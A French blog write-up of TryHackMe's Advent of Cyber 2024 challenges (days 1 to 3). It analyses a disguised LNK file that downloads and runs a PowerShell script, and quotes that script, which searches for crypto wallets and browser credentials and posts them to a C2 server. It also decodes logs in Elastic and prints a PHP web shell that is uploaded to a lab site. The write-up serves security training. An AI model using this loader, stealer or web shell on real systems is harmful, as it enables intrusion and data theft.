---
title: Advent Of Cyber 2024
tags: [TryHackMe, Facile, Avent, Défi]
style: border
color: thm
comments: false
description: Calendrier de l'avent de la Cyber 2024
---
Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>

![Logo Événement](https://tryhackme-images.s3.amazonaws.com/room-icons/62c435d1f4d84a005f5df811-1728982657816)

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?](#jour-1--peut-être-que-la-musique-de-soc-mas-pensait-il-ne-vient-pas-dun-magasin-)
* [Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre](#jour-2--le-faux-positif-dune-personne-est-le-pot-pourri-dun-autre)
* [Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas](#jour-3--même-si-je-voulais-y-aller-leurs-vulnérabilités-ne-le-permettraient-pas)
* [Jour 4 : Je suis tout atomique à l'intérieur](#jour-4--je-suis-tout-atomique-à-lintérieur)
* [Jour 5 : *SCO-mas XX-what-ee?*](#jour-5--sco-mas-xx-what-ee)
* [Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas](#jour-6--si-je-ne-peux-pas-trouver-un-gentil-malware-à-utiliser-je-ne-le-ferai-pas)

## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?

![OPSEC](https://img.shields.io/badge/OPSEC-453368?logo=tryhackme)

![Jour 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730193392309.svg)

Ce premier challenge nous demande d'enquêter sur un site web de téléchargement de vidéos YouTube au format `mp3` ou `mp4` : *The Glitch's All-in-One Converter*

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_website.png" caption="Site web permettant de télécharger des vidéos YouTube" %}

Nous utilisons le lien YouTube fourni dans le texte du défi (<https://www.youtube.com/watch?v=dQw4w9WgXcQ>) afin de tester les fonctionnalités de l'outil.

Nous choisissons le téléchargement en `mp4` et nous récupérons le fichier "super sécurisé"

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_download.png" caption="Téléchargement du fichier super sécurisé" %}

Nous décompressons le fichier obtenu, et nous constatons d'abord que les fichiers sont aux formats `mp3` et non `mp4` comme souhaité.

```bash
unzip download.zip 
Archive:  download.zip
 extracting: song.mp3                
 extracting: somg.mp3
```

Une rapide analyse du fichier `song.mp3` nous indique que malgré le choix de la vidéo en entrée, nous n'avons pas été *Rick Rolled*. A la place nous avons un rap de Noël.

```bash
exiftool song.mp3 
ExifTool Version Number         : 11.88
File Name                       : song.mp3
Directory                       : .
#[...expurgé pour brièveté...]
ID3 Size                        : 2176
Artist                          : T[...expurgé...]y
Album                           : Rap
Title                           : Mount HackIt
Encoded By                      : Mixcraft 10.5 Recording Studio Build 621
Year                            : 2024
Genre                           : Rock
Track                           : 0/1
Comment                         : 
Date/Time Original              : 2024
Duration                        : 0:03:11 (approx)
```

En analysant de la même façon le fichier `somg.mp3` nous observons cette fois qu'il ne s'agit pas d'un fichier sonore, mais d'un lien permettant de télécharger et lancer un fichier PowerShell depuis Github

```bash
exiftool somg.mp3 
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
#[...expurgé pour brièveté...]
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
#[...expurgé pour brièveté...]
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
Machine ID                      : win-base-2019
```

En nous rendant sur le lien Github, nous pouvons constater qu'il s'agit d'un script permettant de contacter un serveur C2 (*Command & Control*) entraînant la compromission de la machine à des fins de minage de cryptomonnaie

```powershell
function Print-AsciiArt {
    #[...expurgé pour brièveté...]
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    #[...expurgé pour brièveté...]
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    #[...expurgé pour brièveté...]
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://[...expurgé...].thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

En poussant l'analyse du compte Github, nous trouvons le nom de la personne qui se cache derrière le pseudo M.M.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_GithubUser.png" caption="Informations sur M.M." %}

En recherchant les *Issues* ouverts par cet utilisateur, nous trouvons un autre dépôt ayant un certain nombre de *Commits* que je ne dévoilerai pas pour conserver une part de challenge !

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_issue.png" caption="Une issue ouverte par l'utilisateur" %}

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-01_repo.png" caption="Le nombre de commits est la dernière question du jour" %}

## Jour 2 : Le faux positif d'une personne, est le pot-pourri d'un autre

![Log analysis](https://img.shields.io/badge/Log%20analysis-314267?logo=tryhackme)

![Jour 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730369227263.png)

Le défi du jour consiste en de l'analyse de log avec l'outil **Elastic**.

Nous commençons par cibler l'intervalle de temps 29/11/2024 00:00 --> 01/12/2024 23:30 comme indiqué dans l'histoire du jour.

Pour simplifier la lecture, nous choisissons d'afficher les valeurs :

* host.hostname
* user.name
* event.outcome
* event.category
* process.command_line
* source_ip

Pour trouver le compte à l'origine des connexions échouées, nous pouvons utiliser le bouton `-` pour exclure les connexions réussies et ne conserver que les échecs.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_failure.png" caption="Un seul compte à l'origine des échecs de connexions" %}

Nous observons plus de 6700 échecs sur la période indiquée.

Si nous filtrons les résultats sur l'adresse IP 10.0.11.11, nous n'observons pas de schéma particulier. En revanche, si nous excluons cette adresse, nous constatons un pic d'échecs provenant d'une autre adresse pouvant s'apparenter à une tentative de force brute.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_suspicious_ip.png" caption="Adresse IP suspecte" %}

En filtrant à présent sur les succès de cette adresse IP vers le serveur ADM-01, nous notons une connexion réussie.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-02_adm_success.png" caption="Connexion réussie à un serveur d'administration" %}

En regardant les actions réalisées depuis cette adresse IP suspecte, il apparaît une commande PowerShell qu'il convient de déchiffrer :

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

A première vue, il s'agit d'une commande passée en base64 mais cela ne suffit pas. A l'aide de l'outil [CyberChef](https://gchq.github.io/CyberChef/) nous pouvons déchiffrer son contenu.

Pour faciliter le déchiffrement, nous utilisons l'opération *Magic* en mode intensif qui nous permet de forcer le chiffrement supplémentaire :

```powershell
Install-WindowsUpdate -AcceptAll -AutoReboot
```

Il s'agit finalement d'un faux positif. Quelqu'un essaie a mis à jour les serveurs afin de mitiger les vulnérabilités.

## Jour 3 : Même si je voulais y aller, leurs vulnérabilités ne le permettraient pas

![Log analysis](https://img.shields.io/badge/Log%20analysis-453368?logo=tryhackme)

![Jour 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420330182.png)

Comme pour le défi de la veille, ce défi consiste à analyser des logs. La différence, c'est que cette fois il nous est demandé de rejouer l'attaque qui sera trouvée.

Les événements à analyser ont eu lieu le 3 octobre 2024 entre 11h30 et 12h00.

Pour faciliter la lecture, nous choisissons d'afficher les champs suivants :

* clientip
* message

La première étape consiste à trouver le chemin du fichier `shell.php` qui a été téléversé. Pour cela, nous utiliserons la requête KQL (Kibana Query Language) : `message:"shell.php"`

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_shell.png" caption="Informations concernant le shell et l'adresse IP qui l'a utilisé" %}

Nous allons à présent utiliser le code {% include dictionary.html word="PHP" %} fourni dans le défi pour reproduire l'attaque {% include dictionary.html word="RCE" %} observée.

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

Ce code permet de créer une page web contenant un champ dans lequel nous pourrons entrer notre commande, et qui nous affichera la réponse en dessous.

Nous commençons par accéder à l'url `hxxp[://]frostypines[.]thm/admin/rooms[.]php`, là où nous avons observé la première occurrence de `shell.php`.

Grâce à l'analyse des logs, nous savons que le shell a été uploadé en tant qu'image pour illustrer une chambre à louer sur le site. Nous allons donc créer une nouvelle chambre afin de pouvoir déposer notre fichier.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell.png" caption="Création d'une nouvelle chambre avec la page PHP" %}

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_upload_shell2.png" caption="Chambre créée" %}

Nous pouvons désormais accéder à notre shell via l'url `hxxp[://]frostypines[.]thm/[...expurgé...]/shell[.]php`

En listant les éléments présents dans le dossier actuel, nous y trouvons le fichier `flag.txt` que nous devons trouver

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_list.png" caption="Le fichier flag.txt est présent dans le dossier" %}

Nous pouvons lire le contenu du fichier pour conclure ce troisième jour.

{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-03_flag.png" caption="Le flag concluant le défi" %}

## Jour 4 : Je suis tout atomique à l'intérieur

![Atomic Red Team](https://img.shields.io/badge/Atomic%20Red%20Team-453368?logo=tryhackme)

## Jour 5 : *SCO-mas XX-what-ee?*

![XXE](https://img.shields.io/badge/XXE-4d354a?logo=tryhackme)

## Jour 6 : Si je ne peux pas trouver un gentil malware à utiliser, je ne le ferai pas

![Log analysis](https://img.shields.io/badge/Sandboxes-314267?logo=tryhackme)
